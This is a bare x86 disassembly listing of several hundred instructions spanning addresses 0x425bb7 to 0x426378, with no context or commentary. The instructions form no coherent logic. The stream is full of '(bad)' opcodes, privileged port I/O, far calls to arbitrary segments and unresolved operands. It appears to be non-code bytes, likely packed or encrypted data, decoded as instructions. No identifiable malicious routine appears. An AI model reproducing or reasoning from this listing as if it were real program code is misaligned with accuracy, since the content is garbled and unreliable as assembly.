  425bb7:	mov    ds:0x533504ab,eax
  425bbc:	aaa    
  425bbd:	mov    ebp,0x7502733c
  425bc2:	jne    0x425c28
  425bc4:	dec    esp
  425bc5:	cmp    al,0x46
  425bc7:	push   ebx
  425bc8:	js     0x425b74
  425bca:	push   edx
  425bcb:	jp     0x425c1c
  425bcd:	fs mov ah,0x4e
  425bd0:	cwde   
  425bd1:	lahf   
  425bd2:	(bad)  
  425bd3:	out    dx,eax
  425bd4:	cmp    esi,ebp
  425bd6:	cld    
  425bd7:	ret    
  425bd8:	aaa    
  425bd9:	ins    BYTE PTR es:[edi],dx
  425bda:	repnz popf 
  425bdc:	push   cs
  425bdd:	mov    BYTE PTR [ebx-0x43],dl
  425be0:	and    DWORD PTR [esi+0x27],ebp
  425be3:	es js  0x425bc9
  425be6:	add    BYTE PTR [esi-0x531dbdc4],ah
  425bec:	pause  
  425bee:	mov    al,ds:0xe0d01db9
  425bf3:	cwde   
  425bf4:	nop
  425bf5:	mov    cl,0xd9
  425bf7:	jp     0x425c14
  425bf9:	aaa    
  425bfa:	sub    BYTE PTR [esi-0x7e],0x76
  425bfe:	shl    DWORD PTR [edx+edi*4-0x48],cl
  425c02:	dec    eax
  425c03:	inc    eax
  425c04:	adc    eax,0x26aa52f
  425c09:	adc    dl,dh
  425c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c0c:	jl     0x425bfa
  425c0e:	add    eax,0x276b5413
  425c13:	rcr    BYTE PTR [esp+edi*8-0x6493c3c4],0x66
  425c1b:	in     eax,dx
  425c1c:	call   0x1876:0x4b9597a2
  425c23:	cs pop edx
  425c25:	imul   ebp,DWORD PTR [ebp+0x7853c322],0xffffffb4
  425c2c:	mov    dh,0x1c
  425c2e:	(bad)  
  425c2f:	dec    ebx
  425c30:	in     al,dx
  425c31:	mov    al,0xb
  425c33:	push   cs
  425c34:	fnstsw WORD PTR [ebx-0x22d0cfec]
  425c3a:	adc    al,0x69
  425c3c:	jno    0x425c58
  425c3e:	fdiv   DWORD PTR [ecx]
  425c40:	js     0x425c87
  425c42:	int3   
  425c43:	fwait
  425c44:	or     al,0xba
  425c46:	std    
  425c47:	out    dx,al
  425c48:	aas    
  425c49:	mov    al,0x4b
  425c4b:	sbb    DWORD PTR [edx+0x3aa77d8f],edx
  425c51:	cmp    ebp,DWORD PTR [ecx-0x294884d4]
  425c57:	arpl   WORD PTR [ebx-0x2b359718],si
  425c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c5e:	into   
  425c5f:	cld    
  425c60:	loop   0x425c3c
  425c62:	aam    0x28
  425c64:	pushf  
  425c65:	mov    WORD PTR [edx-0x47324250],gs
  425c6b:	rol    BYTE PTR [ebx+0x5321ab24],cl
  425c71:	popa   
  425c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c73:	shr    BYTE PTR [esi+0xf2850f6],cl
  425c79:	sub    eax,0x81c43576
  425c7e:	push   ss
  425c7f:	scas   al,BYTE PTR es:[edi]
  425c80:	and    edi,edx
  425c82:	fidiv  DWORD PTR [edi+eax*8+0x539c198b]
  425c89:	cmp    eax,DWORD PTR [eax]
  425c8b:	pushf  
  425c8c:	and    DWORD PTR [ecx+0x296a6b06],0xa65d49d4
  425c96:	fistp  DWORD PTR [ecx]
  425c98:	sti    
  425c99:	mov    edi,DWORD PTR [ebp+0x2d]
  425c9c:	pushf  
  425c9d:	call   esi
  425c9f:	mov    dl,0x10
  425ca1:	jmp    0x32a0:0xf1f7ed71
  425ca8:	jbe    0x425d19
  425caa:	call   0xdf707099
  425caf:	or     BYTE PTR ds:0x15542314,dl
  425cb5:	scas   al,BYTE PTR es:[edi]
  425cb6:	and    ebx,DWORD PTR [ebx]
  425cb8:	xor    eax,0xae260fd3
  425cbd:	movsx  esi,WORD PTR [ecx]
  425cc0:	jg     0x425cc7
  425cc2:	mov    dl,ah
  425cc4:	fnstsw WORD PTR [esi+0x313b8df1]
  425cca:	xor    eax,DWORD PTR [edi]
  425ccc:	lods   al,BYTE PTR ds:[esi]
  425ccd:	push   0x1a90f9d
  425cd2:	fimul  DWORD PTR [esi-0x59c01ffd]
  425cd8:	daa    
  425cd9:	add    eax,0x9d1d97b3
  425cde:	jg     0x425cd5
  425ce0:	jecxz  0x425ca3
  425ce2:	push   ebp
  425ce3:	and    al,0xf9
  425ce5:	stos   BYTE PTR es:[edi],al
  425ce6:	out    0x79,al
  425ce8:	in     al,dx
  425ce9:	out    0x79,al
  425ceb:	sub    al,0x6c
  425ced:	ins    BYTE PTR es:[edi],dx
  425cee:	push   0x47f42a24
  425cf3:	fwait
  425cf4:	call   0xb395:0xf940e086
  425cfb:	xlat   BYTE PTR ds:[ebx]
  425cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cfd:	xchg   bl,dh
  425cff:	outs   dx,BYTE PTR ds:[esi]
  425d00:	cmp    al,bh
  425d02:	or     BYTE PTR [esi-0x80],bl
  425d05:	call   0x81e8:0x3c65ea78
  425d0c:	adc    eax,0x3d2c3511
  425d11:	int    0xab
  425d13:	adc    al,0x7d
  425d15:	out    dx,eax
  425d16:	jno    0x425ca5
  425d18:	(bad)  
  425d19:	in     al,dx
  425d1a:	jb     0x425d54
  425d1c:	bound  eax,QWORD PTR [esi+eax*1]
  425d1f:	cmp    BYTE PTR [ebx],0xd4
  425d22:	pop    ebx
  425d23:	mov    ebx,0xf75e8d7c
  425d28:	sub    DWORD PTR [ebp-0x39],ebp
  425d2b:	jae    0x425d0d
  425d2d:	cmp    al,0x5d
  425d2f:	lds    ebx,FWORD PTR [ecx]
  425d31:	and    al,0x7f
  425d33:	jns    0x425d71
  425d35:	add    al,0x5e
  425d37:	mov    edx,0x4c4b2012
  425d3c:	sar    BYTE PTR [edx-0x3e],1
  425d3f:	int3   
  425d40:	fistp  DWORD PTR [esp+edx*2]
  425d43:	mov    gs,edx
  425d45:	add    eax,DWORD PTR [edx-0x65]
  425d48:	cld    
  425d49:	cli    
  425d4a:	sub    eax,0x5bac047c
  425d4f:	daa    
  425d50:	or     DWORD PTR [eax-0x7b],0xbb2d7e9
  425d57:	retf   0xae6e
  425d5a:	in     al,dx
  425d5b:	mov    ecx,0x20b3b087
  425d60:	mov    ebp,?
  425d62:	fidiv  WORD PTR [ebx+0x20]
  425d65:	into   
  425d66:	inc    esi
  425d67:	mov    esp,0xaf8bc38c
  425d6c:	(bad)  
  425d6e:	xor    DWORD PTR [ecx-0x75],0xffffff92
  425d72:	repnz test al,0x45
  425d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d76:	fld    TBYTE PTR [edi+0x12]
  425d79:	loopne 0x425dd7
  425d7b:	dec    esp
  425d7c:	ins    DWORD PTR es:[edi],dx
  425d7d:	sti    
  425d7e:	xor    eax,0xb23637d1
  425d83:	xchg   ecx,eax
  425d84:	xor    ebp,0x10
  425d87:	stos   BYTE PTR es:[di],al
  425d89:	and    eax,0xd8692ff9
  425d8e:	stos   DWORD PTR es:[edi],eax
  425d8f:	jle    0x425e03
  425d91:	addr16 cld 
  425d93:	popf   
  425d94:	pop    eax
  425d95:	mov    BYTE PTR [eax-0x4c],0x39
  425d99:	inc    esi
  425d9a:	jp     0x425d5f
  425d9c:	out    0x9f,eax
  425d9e:	sub    BYTE PTR [edx+0x13],al
  425da1:	addr16 mov al,ds:0x824d
  425da5:	test   DWORD PTR [ecx+0xa808f2b],0x6c7fee92
  425daf:	or     ch,BYTE PTR [ecx+0x29dbf78e]
  425db5:	retf   
  425db6:	adc    DWORD PTR [esi],0x3d
  425db9:	push   ebp
  425dba:	mov    edi,esi
  425dbc:	int3   
  425dbd:	jnp    0x425da3
  425dbf:	pop    es
  425dc0:	dec    ebp
  425dc1:	nop
  425dc2:	fmul   QWORD PTR ds:0x68c8cc4d
  425dc8:	inc    esp
  425dc9:	out    0x6a,eax
  425dcb:	or     BYTE PTR [ecx],bl
  425dcd:	cmp    eax,0xb1485678
  425dd2:	adc    BYTE PTR [ebx+0x577496d4],dh
  425dd8:	hlt    
  425dd9:	in     al,dx
  425dda:	adc    ch,ch
  425ddc:	mov    ebx,DWORD PTR [edi]
  425dde:	aaa    
  425ddf:	dec    esp
  425de0:	(bad)  
  425de2:	jae    0x425da0
  425de4:	fdivr  QWORD PTR [ebp+eax*4-0x66]
  425de8:	push   esi
  425de9:	mul    DWORD PTR [edi-0x3672860a]
  425def:	mov    ebp,DWORD PTR [edi+ebp*8-0x7a6096fc]
  425df6:	(bad)  
  425df7:	(bad)  
  425df9:	xor    esp,DWORD PTR [edx-0x7a33787e]
  425dff:	mov    edi,DWORD PTR [ecx-0x25]
  425e02:	inc    eax
  425e03:	sbb    ecx,DWORD PTR [edi]
  425e05:	lea    edx,[ebp+eiz*8+0x1ef64892]
  425e0c:	xchg   ecx,eax
  425e0d:	pop    ebx
  425e0e:	addps  xmm3,XMMWORD PTR [ebp-0x47]
  425e12:	dec    ecx
  425e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e14:	pop    ds
  425e15:	popa   
  425e16:	dec    ebp
  425e17:	fldenv [edx-0x3d]
  425e1a:	cdq    
  425e1b:	and    BYTE PTR [ebx+ebx*8+0x3d],al
  425e1f:	mov    esp,0x42cc52c6
  425e24:	div    BYTE PTR [ecx]
  425e26:	js     0x425e2c
  425e28:	push   0x35
  425e2a:	mov    bh,0xc0
  425e2c:	mov    bh,BYTE PTR [edi+eiz*1-0x768b2f02]
  425e33:	xchg   edx,eax
  425e34:	push   es
  425e35:	loope  0x425dd5
  425e37:	adc    ebx,ecx
  425e39:	mov    ebx,0xda963a9f
  425e3e:	mov    bl,0x10
  425e40:	mov    ebp,0x6311ec2f
  425e45:	out    0x74,al
  425e47:	retf   
  425e48:	sar    BYTE PTR [ecx],cl
  425e4a:	inc    edx
  425e4b:	inc    esp
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x39
  425e57:	push   edx
  425e58:	push   ecx
  425e59:	adc    eax,0x1ec58
  425e5e:	mov    BYTE PTR [esi],al
  425e60:	add    BYTE PTR [eax],al
  425e62:	mov    ecx,0x4d734098
  425e67:	push   esi
  425e68:	pop    ss
  425e69:	inc    ecx
  425e6a:	imul   ebp,DWORD PTR [esp+esi*2-0x6fd13f2],0xaf4a2015
  425e75:	lods   eax,DWORD PTR ds:[esi]
  425e76:	jge    0x425e66
  425e78:	clc    
  425e79:	call   0xa707:0xac80c4f
  425e80:	sub    DWORD PTR [eax+0x3c],edx
  425e83:	xchg   esi,eax
  425e84:	xor    DWORD PTR [ebx-0x5b15d5ff],edi
  425e8a:	mov    dh,0x29
  425e8c:	mov    al,0x15
  425e8e:	push   ebp
  425e8f:	inc    ebp
  425e90:	call   0xd76:0x53176b43
  425e97:	stc    
  425e98:	out    0xdf,eax
  425e9a:	out    dx,al
  425e9b:	lods   eax,DWORD PTR ds:[esi]
  425e9c:	inc    DWORD PTR [ebx]
  425e9e:	popf   
  425e9f:	push   ebp
  425ea0:	mov    ah,0xa9
  425ea2:	cmp    BYTE PTR [eax],dl
  425ea4:	scas   eax,DWORD PTR es:[edi]
  425ea5:	push   esi
  425ea6:	jb     0x425e45
  425ea8:	xchg   DWORD PTR [edi],eax
  425eaa:	push   es
  425eab:	cli    
  425eac:	lea    esi,[bp+di-0x35]
  425eb0:	jb     0x425ecb
  425eb2:	or     al,0x6a
  425eb4:	loopne 0x425e6b
  425eb6:	sub    ch,BYTE PTR [eax-0x323656ca]
  425ebc:	aaa    
  425ebd:	scas   al,BYTE PTR es:[edi]
  425ebe:	mov    ds:0x4bfc78ba,al
  425ec3:	add    eax,0x8d601df9
  425ec8:	sahf   
  425ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eca:	push   ecx
  425ecb:	lds    ebx,FWORD PTR [edx]
  425ecd:	test   edx,ecx
  425ecf:	ja     0x425f0c
  425ed1:	adc    DWORD PTR [eax],ebx
  425ed3:	cli    
  425ed4:	mov    esp,0xd95b676e
  425ed9:	leave  
  425eda:	stos   DWORD PTR es:[edi],eax
  425edb:	dec    edx
  425edc:	out    0x1,eax
  425ede:	pop    ebx
  425edf:	sar    DWORD PTR [edx-0x65b60d3],1
  425ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ee6:	sub    al,0xab
  425ee8:	lods   eax,DWORD PTR ds:[esi]
  425ee9:	int3   
  425eea:	mov    bl,0x68
  425eec:	jmp    0x4e3ad801
  425ef1:	push   ds
  425ef2:	sub    al,BYTE PTR [ebp+0x385f6730]
  425ef8:	iret   
  425ef9:	loope  0x425efb
  425efb:	lahf   
  425efc:	stos   DWORD PTR es:[edi],eax
  425efd:	mov    dh,0x35
  425eff:	xlat   BYTE PTR ds:[ebx]
  425f00:	(bad)  
  425f01:	and    dl,ah
  425f03:	mov    edi,0x1bad8bb
  425f08:	mov    esi,fs
  425f0a:	pop    eax
  425f0b:	or     esi,ecx
  425f0d:	add    BYTE PTR ds:0xc33f9809,dh
  425f13:	ds out dx,eax
  425f15:	xor    DWORD PTR [ebp-0x26296583],edx
  425f1b:	aam    0xe4
  425f1d:	mov    ebx,0xb24d35fc
  425f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f23:	in     al,dx
  425f24:	aas    
  425f25:	jae    0x425f45
  425f27:	outs   dx,DWORD PTR ds:[si]
  425f29:	mov    ds:0x398a0af9,al
  425f2e:	xchg   edi,eax
  425f2f:	mov    edi,0x38e7021
  425f34:	adc    DWORD PTR [ebx],edx
  425f36:	and    DWORD PTR [ebp+0x3e612a1a],ecx
  425f3c:	mov    dl,0x1f
  425f3e:	bound  ecx,QWORD PTR [esi]
  425f40:	push   ds
  425f41:	push   edi
  425f42:	outs   dx,DWORD PTR ds:[esi]
  425f43:	xchg   BYTE PTR [esi+0x539a29ad],bl
  425f49:	jl     0x425ef2
  425f4b:	lods   al,BYTE PTR ds:[esi]
  425f4c:	pop    ebx
  425f4d:	bound  ebp,QWORD PTR [edi-0x1]
  425f50:	mov    bh,0xee
  425f52:	xchg   edi,eax
  425f53:	add    bh,BYTE PTR [edi-0x32]
  425f56:	cmc    
  425f57:	pop    ebp
  425f58:	fbld   TBYTE PTR [ebx-0x7b2cde94]
  425f5e:	xchg   edx,eax
  425f5f:	jl     0x425f88
  425f61:	push   ds
  425f62:	inc    ebp
  425f63:	bound  ecx,QWORD PTR [eax-0x53]
  425f66:	nop
  425f67:	mov    dl,BYTE PTR [ecx-0x19]
  425f6a:	sub    eax,eax
  425f6c:	lock xchg edx,eax
  425f6e:	clc    
  425f6f:	push   cs
  425f70:	(bad)  
  425f71:	and    esp,ebp
  425f73:	fst    DWORD PTR [ecx+0x75]
  425f76:	or     eax,0xbe454365
  425f7b:	jo     0x425f58
  425f7d:	das    
  425f7e:	mov    eax,ds:0x26a9e9b9
  425f83:	cmp    al,0xa8
  425f85:	jl     0x425fda
  425f87:	mov    dl,0x6f
  425f89:	shl    DWORD PTR [esi+edx*2],cl
  425f8c:	es add eax,0xf8d7f9f8
  425f92:	dec    esi
  425f93:	mov    DWORD PTR [ecx-0x7f],edx
  425f96:	pop    esi
  425f97:	xlat   BYTE PTR ds:[ebx]
  425f98:	adc    DWORD PTR [edx-0x57503bd5],ebp
  425f9e:	adc    ch,BYTE PTR [edx-0x4e]
  425fa1:	and    ah,bh
  425fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fa4:	push   esp
  425fa5:	inc    esi
  425fa6:	(bad)  
  425fa7:	aaa    
  425fa8:	sbb    eax,0xecdd8919
  425fad:	pop    ss
  425fae:	ret    0x65df
  425fb1:	push   edx
  425fb2:	or     eax,0xc17f496
  425fb7:	dec    ebp
  425fb8:	clc    
  425fb9:	sbb    eax,ecx
  425fbb:	xchg   edi,eax
  425fbc:	addr16 jmp 0x425fc6
  425fbf:	sti    
  425fc0:	jne    0x426010
  425fc2:	dec    edx
  425fc3:	mov    ds:0x2a2caf26,eax
  425fc8:	and    al,BYTE PTR [esi]
  425fca:	bound  ecx,QWORD PTR [edx-0x43]
  425fcd:	cmp    dh,al
  425fcf:	and    ch,BYTE PTR [eax]
  425fd1:	mov    dl,0x64
  425fd3:	add    BYTE PTR [edi+0x2da45d6f],dh
  425fd9:	loop   0x42604c
  425fdb:	mov    BYTE PTR [esp+edx*8],al
  425fde:	or     ecx,DWORD PTR [edi]
  425fe0:	sahf   
  425fe1:	sbb    edi,DWORD PTR [esi+edi*4-0x6f]
  425fe5:	nop
  425fe6:	pushw  cs
  425fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe9:	repnz test eax,0xc88f21b5
  425fef:	or     edi,DWORD PTR [edx-0x67a5e11b]
  425ff5:	(bad)  
  425ff6:	sbb    cl,BYTE PTR [ebx-0x72]
  425ff9:	iret   
  425ffa:	je     0x426076
  425ffc:	pop    esp
  425ffd:	int3   
  425ffe:	mov    ds:0x1f1d7f29,eax
  426003:	pusha  
  426004:	pop    ebp
  426005:	mov    eax,ebx
  426007:	hlt    
  426008:	add    BYTE PTR [edx+ecx*2],ch
  42600b:	xchg   ebp,eax
  42600c:	pop    ebp
  42600d:	lods   al,BYTE PTR ds:[esi]
  42600e:	shr    BYTE PTR [ebp-0x58],cl
  426011:	add    DWORD PTR [ecx+0x54],0xae3499f2
  426018:	das    
  426019:	jmp    0x42608f
  42601b:	ss mov ah,0x7a
  42601e:	sti    
  42601f:	mov    bh,BYTE PTR [ebx-0x17]
  426022:	in     al,0xe5
  426024:	mov    esi,0x545f013e
  426029:	push   ds
  42602a:	cmovne edi,DWORD PTR [edi]
  42602d:	pop    ebp
  42602e:	mov    eax,0x92f0347
  426033:	mov    edi,0x7e5d971b
  426038:	and    esp,ebx
  42603a:	into   
  42603b:	rcl    BYTE PTR [edx],cl
  42603d:	jnp    0x425fe4
  42603f:	popa   
  426040:	lods   eax,DWORD PTR ds:[esi]
  426041:	call   0x14c0:0xdbbf7faa
  426048:	aad    0xb
  42604a:	sub    eax,0x6af7a77d
  42604f:	scas   eax,DWORD PTR es:[edi]
  426050:	aam    0x98
  426052:	(bad)  [edx-0x13266aef]
  426058:	fnsave [esi-0x7cd21193]
  42605e:	nop
  42605f:	aaa    
  426060:	(bad)  
  426061:	outs   dx,DWORD PTR ds:[esi]
  426062:	adc    BYTE PTR [ecx],al
  426064:	cmp    eax,0x1e1b06d9
  426069:	cwde   
  42606a:	mov    dh,0xc5
  42606c:	sbb    al,0x0
  42606e:	adc    edx,DWORD PTR [ecx-0x1c]
  426071:	(bad)  
  426072:	(bad)  
  426073:	out    0xac,al
  426075:	inc    edi
  426076:	or     bh,0x72
  426079:	xchg   BYTE PTR [ebx-0x44],ah
  42607c:	adc    DWORD PTR [edi],ecx
  42607e:	scas   al,BYTE PTR es:[edi]
  42607f:	or     al,0xec
  426081:	adc    edi,DWORD PTR [edi-0x75e8e081]
  426087:	out    0xe,al
  426089:	(bad)  
  42608a:	es jle 0x4260b2
  42608d:	out    dx,al
  42608e:	inc    edx
  42608f:	mov    ds:0x1fef2b27,eax
  426094:	and    al,0xfb
  426096:	jmp    0x9ac81f00
  42609b:	cmp    BYTE PTR [eax-0x5e],cl
  42609e:	ret    
  42609f:	in     al,dx
  4260a0:	(bad)  
  4260a1:	cli    
  4260a2:	test   eax,0x2b960ba3
  4260a7:	pop    esi
  4260a8:	or     eax,0x744c8862
  4260ad:	dec    esp
  4260ae:	or     al,0x6e
  4260b0:	nop
  4260b1:	mov    cs:0x1cc27af4,al
  4260b7:	ja     0x426067
  4260b9:	enter  0x6f8c,0x96
  4260bd:	hlt    
  4260be:	mov    al,0xd6
  4260c0:	pushf  
  4260c1:	xor    esp,edx
  4260c3:	stc    
  4260c4:	xchg   edx,eax
  4260c5:	stos   BYTE PTR es:[edi],al
  4260c6:	or     al,0x62
  4260c8:	xor    eax,0x48c9fced
  4260cd:	(bad)  
  4260ce:	fiadd  DWORD PTR [ebx+edx*8-0x3c]
  4260d2:	fnsave [edx]
  4260d4:	mov    al,ds:0xa44d4291
  4260d9:	xor    eax,0xe5522b63
  4260de:	cmp    esi,0x3bbfb042
  4260e4:	jmp    0xc6a0:0x22c2773f
  4260eb:	xor    al,0x88
  4260ed:	cwde   
  4260ee:	ja     0x426169
  4260f0:	retf   0xa811
  4260f3:	sub    al,0x7
  4260f5:	jge    0x42615b
  4260f7:	repnz push esp
  4260f9:	mov    ebp,0x458098d7
  4260fe:	cwde   
  4260ff:	push   cs
  426100:	mov    ds,WORD PTR ds:0x84cc2db8
  426106:	imul   edx,DWORD PTR [esi+0x22],0xffffffd7
  42610a:	add    DWORD PTR [ebx],esi
  42610c:	add    eax,0xafc73f31
  426111:	jmp    0xbf3620b8
  426116:	cmp    eax,0x4019793b
  42611b:	in     al,dx
  42611c:	lds    eax,FWORD PTR [eax]
  42611e:	popa   
  42611f:	xchg   BYTE PTR [edi+esi*4],cl
  426122:	dec    ebp
  426123:	call   0xc6916c2a
  426128:	pop    edi
  426129:	lahf   
  42612a:	lds    ebp,FWORD PTR [ebp+ebp*1+0x2e]
  42612e:	cmp    al,0x6d
  426130:	test   DWORD PTR [esi+0x53],edx
  426133:	rcl    edi,0x3d
  426136:	popf   
  426137:	in     al,dx
  426138:	mov    ebx,0x5e362ca6
  42613d:	or     ecx,edi
  42613f:	and    BYTE PTR ss:[eax+edx*1],0xbc
  426144:	out    0xcb,al
  426146:	and    al,0xc4
  426148:	lock add ah,BYTE PTR [esi+0x6d455e86]
  42614f:	shl    bl,1
  426151:	mov    bh,0xff
  426153:	pop    edi
  426154:	(bad)  
  426155:	lahf   
  426156:	or     BYTE PTR [ecx+0x3c],bl
  426159:	rol    BYTE PTR [ebp-0x515468e],0x3d
  426160:	push   ds
  426161:	shr    BYTE PTR [esi-0x26],cl
  426164:	fmul   st,st(1)
  426166:	jg     0x426103
  426168:	popf   
  426169:	js     0x426176
  42616b:	add    DWORD PTR [ebp+0x6e936b33],ebx
  426171:	std    
  426172:	or     BYTE PTR [ecx],ah
  426174:	sbb    eax,0xadbd9b4b
  426179:	dec    esi
  42617a:	xchg   esp,eax
  42617b:	fwait
  42617c:	dec    esi
  42617d:	mov    ebp,0x70059cac
  426182:	lock mov al,ds:0x63fec900
  426188:	loop   0x42617b
  42618a:	adc    BYTE PTR [ebp+0x437adbf9],al
  426190:	mov    ebx,0xbfab0fb1
  426195:	hlt    
  426196:	cmp    dl,BYTE PTR [edi+0x32]
  426199:	stc    
  42619a:	xor    DWORD PTR cs:[ecx+0x2250df6b],0x820cba94
  4261a5:	add    al,BYTE PTR [esi+0x44]
  4261a8:	adc    DWORD PTR [ecx],eax
  4261aa:	jb     0x4261b8
  4261ac:	ss push ebp
  4261ae:	sbb    DWORD PTR [esi-0x29d42b6a],esi
  4261b4:	push   cs
  4261b5:	pusha  
  4261b6:	int3   
  4261b7:	add    eax,0xf8bed2d7
  4261bc:	cs aaa 
  4261be:	or     esp,esi
  4261c0:	mov    bh,0x45
  4261c2:	dec    edx
  4261c3:	call   0x583a:0x80991d16
  4261ca:	in     al,dx
  4261cb:	out    0x1b,eax
  4261cd:	inc    edi
  4261ce:	in     eax,0x28
  4261d0:	shr    BYTE PTR [ebx+0x4dc9e5db],1
  4261d6:	jg     0x426245
  4261d8:	cmp    ebp,DWORD PTR ds:[eax+edi*4+0x197efeaa]
  4261e0:	test   BYTE PTR [ebx-0x1ac27db3],cl
  4261e6:	ins    DWORD PTR es:[edi],dx
  4261e7:	leave  
  4261e8:	out    dx,eax
  4261e9:	inc    ebp
  4261ea:	mov    BYTE PTR es:[ebx+0x7288d384],dh
  4261f1:	rcl    eax,1
  4261f3:	mov    ah,0xfa
  4261f5:	lds    esi,FWORD PTR [edx-0x476bd4e0]
  4261fb:	mov    ebp,0x5a9d2c
  426200:	or     DWORD PTR [eax-0x6a],0xe9672eeb
  426207:	xor    eax,0x43fd6249
  42620c:	stc    
  42620d:	xor    edi,esi
  42620f:	add    edi,DWORD PTR [edi]
  426211:	or     eax,0x276e6c99
  426216:	adc    ebp,DWORD PTR [esi-0x1c]
  426219:	and    DWORD PTR [esi-0xc2b50e3],edi
  42621f:	inc    dh
  426221:	or     eax,0xb5fcee9f
  426226:	cdq    
  426227:	daa    
  426228:	mov    eax,ds:0x1a0cd967
  42622d:	popf   
  42622e:	cmp    eax,DWORD PTR [eax+ebp*2+0x3ab27025]
  426235:	js     0x426247
  426237:	repz push eax
  426239:	rol    BYTE PTR [eax],1
  42623b:	push   ebp
  42623c:	call   0x7586:0xe85d902
  426243:	push   esp
  426244:	jb     0x426259
  426246:	repz test BYTE PTR [ebx],bl
  426249:	jne    0x426248
  42624b:	fisttp QWORD PTR [eax+esi*4]
  42624e:	inc    edi
  42624f:	cmp    cl,0x37
  426252:	imul   edx,DWORD PTR [ebp-0x7e],0xffffffb6
  426256:	cmp    al,0xde
  426258:	outs   dx,BYTE PTR ds:[esi]
  426259:	pop    ecx
  42625a:	mov    ah,0xcb
  42625c:	pop    ds
  42625d:	pop    esi
  42625e:	ins    BYTE PTR es:[edi],dx
  42625f:	push   esp
  426260:	push   esp
  426261:	adc    dl,BYTE PTR [edi+0x35]
  426264:	cmc    
  426265:	add    eax,0x857aa98a
  42626a:	pop    ebp
  42626b:	jb     0x4262bb
  42626d:	outs   dx,BYTE PTR ds:[esi]
  42626e:	push   cs
  42626f:	mov    dl,0x5f
  426271:	or     cl,BYTE PTR [edi-0x6ee66b3b]
  426277:	mov    eax,0x652ec13c
  42627c:	and    dl,dh
  42627e:	in     eax,0xab
  426280:	push   esp
  426281:	inc    esi
  426282:	iret   
  426283:	hlt    
  426284:	iret   
  426285:	mov    eax,DWORD PTR [esp+eax*2+0x66]
  426289:	(bad)  
  42628a:	fdiv   DWORD PTR [esi]
  42628c:	aam    0x42
  42628e:	mov    al,ds:0x4e233219
  426293:	and    al,0xc2
  426295:	sub    BYTE PTR [edx-0x6],cl
  426298:	mov    eax,0xcd5c451f
  42629d:	ror    DWORD PTR [ebx+0x18bd9ec2],cl
  4262a3:	or     cl,dh
  4262a5:	push   0xffffffc1
  4262a7:	or     DWORD PTR [edi-0xb],0xffffffe5
  4262ab:	pop    ecx
  4262ac:	test   eax,0xb48ac13f
  4262b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262b2:	and    edx,DWORD PTR [ebx]
  4262b4:	repnz xchg ebx,eax
  4262b6:	icebp  
  4262b7:	xlat   BYTE PTR ds:[ebx]
  4262b8:	adc    ebx,DWORD PTR [esi-0x46f04124]
  4262be:	or     dh,BYTE PTR ds:0xe35d959e
  4262c4:	dec    DWORD PTR [eax]
  4262c6:	les    esi,FWORD PTR [ebx-0x53025b43]
  4262cc:	mov    bh,0xad
  4262ce:	ret    0xcae1
  4262d1:	mov    al,0x81
  4262d3:	pop    ebp
  4262d4:	pop    es
  4262d5:	inc    ebx
  4262d6:	add    edx,DWORD PTR [edi+0x3e]
  4262d9:	xlat   BYTE PTR ds:[ebx]
  4262da:	outs   dx,BYTE PTR ds:[esi]
  4262db:	lea    esi,[ebx-0x11]
  4262de:	imul   edi,DWORD PTR [esi+0x10a94751],0xffffffa5
  4262e5:	sahf   
  4262e6:	lods   al,BYTE PTR ds:[esi]
  4262e7:	icebp  
  4262e8:	scas   eax,DWORD PTR es:[edi]
  4262e9:	scas   al,BYTE PTR es:[edi]
  4262ea:	xor    DWORD PTR [esi+0x6b],0xfedf9d76
  4262f1:	ja     0x42634a
  4262f3:	scas   al,BYTE PTR es:[edi]
  4262f4:	test   eax,0x6acb7415
  4262f9:	xlat   BYTE PTR ds:[ebx]
  4262fa:	ficomp DWORD PTR [esi+0x185e72de]
  426300:	shl    DWORD PTR [ebx+0x2e109fa7],cl
  426306:	repnz push eax
  426308:	xchg   BYTE PTR [ebx+0x4d6bbd25],ah
  42630e:	jne    0x426347
  426310:	push   cs
  426311:	push   ebx
  426312:	dec    edx
  426313:	dec    esi
  426314:	pop    ecx
  426315:	shl    bh,1
  426317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426318:	arpl   WORD PTR [esi+0x34cd4ec1],ax
  42631e:	and    cl,BYTE PTR [esi-0x44]
  426321:	add    BYTE PTR [edi+0x31],ch
  426324:	lahf   
  426325:	pop    es
  426326:	mov    esp,esi
  426328:	es in  al,0x98
  42632b:	lahf   
  42632c:	js     0x4262de
  42632e:	inc    ebp
  42632f:	or     eax,0x3506c815
  426334:	pop    ds
  426335:	sbb    al,0xef
  426337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426338:	mov    dl,0x65
  42633a:	mov    BYTE PTR [ecx+0x39],cl
  42633d:	fld    QWORD PTR [ecx-0x30]
  426340:	dec    esi
  426341:	xor    ch,bl
  426343:	jle    0x4262ef
  426345:	dec    ecx
  426346:	addr16 xchg ebp,eax
  426348:	or     eax,0x6b21c6f6
  42634d:	push   ds
  42634e:	sub    DWORD PTR [edx+ebp*1+0x63eec1d2],0x19
  426356:	inc    eax
  426357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426358:	adc    DWORD PTR [ebp+0x45],0x7c7b5c2f
  42635f:	mov    esi,0x5d2a1360
  426364:	jp     0x426315
  426366:	out    0x99,eax
  426368:	jg     0x42636a
  42636a:	aad    0xf7
  42636c:	shr    DWORD PTR [edx],0x61
  42636f:	jbe    0x4263e0
  426371:	into   
  426372:	mov    ?,WORD PTR [ebp-0x79]
  426375:	das    
  426376:	pop    ebp
  426377:	clc    
  426378:	pushf  
